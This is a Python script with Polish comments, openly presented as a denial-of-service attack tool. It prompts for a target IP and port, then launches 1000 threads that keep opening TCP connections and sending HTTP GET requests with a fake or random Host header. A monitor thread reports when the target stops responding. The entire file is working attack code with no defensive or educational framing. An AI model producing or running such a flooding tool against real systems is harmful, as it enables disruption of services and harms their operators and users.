from socket import *
from threading import Thread
import time
import random

# Pobieranie danych od użytkownika
target = input("What is your target (ex. 192.168.1.1)> ")
port = int(input(f"On which port of {target} to attack (ex. 80 for HTTP)> "))
fakeip = input("Which IP do you want to use in the attack (leave blank for random)> ")

# Flaga do zatrzymania ataku
server_down = False
stop_threads = False

# Funkcja do generowania losowego IP
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# Funkcja wykonująca atak
def attack():
    while not stop_threads and not server_down:
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((target, port))
            ip_to_use = fakeip if fakeip else generate_random_ip()
            s.send(f"GET / HTTP/1.1\r\nHost: {ip_to_use}\r\n\r\n".encode('ascii'))
            s.close()
        except:
            pass

# Funkcja monitorująca dostępność serwera
def monitor_server():
    global server_down, stop_threads
    while not stop_threads:
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(1)  # Timeout na 1 sekundę
            s.connect((target, port))
            s.close()
            print(f"[INFO] {target}:{port} is still reachable.")
        except:
            print(f"[ALERT] {target}:{port} seems down!")
            server_down = True
            break
        time.sleep(2)  # Odczekaj 2 sekundy przed kolejną próbą

# Uruchomienie wątków atakujących
threads = []
for i in range(1000):
    thread = Thread(target=attack)
    thread.start()
    threads.append(thread)

# Uruchomienie monitoringu serwera w osobnym wątku
monitor_thread = Thread(target=monitor_server)
monitor_thread.start()

# Obsługa wyjścia przez Ctrl + C
try:
    monitor_thread.join()  # Czekanie na zakończenie monitoringu
except KeyboardInterrupt:
    print("\n[INFO] Ctrl + C detected! Stopping attack...")
    stop_threads = True

# Oczekiwanie na zakończenie wszystkich wątków
for thread in threads:
    thread.join()
monitor_thread.join()
print("Attack stopped successfully.")
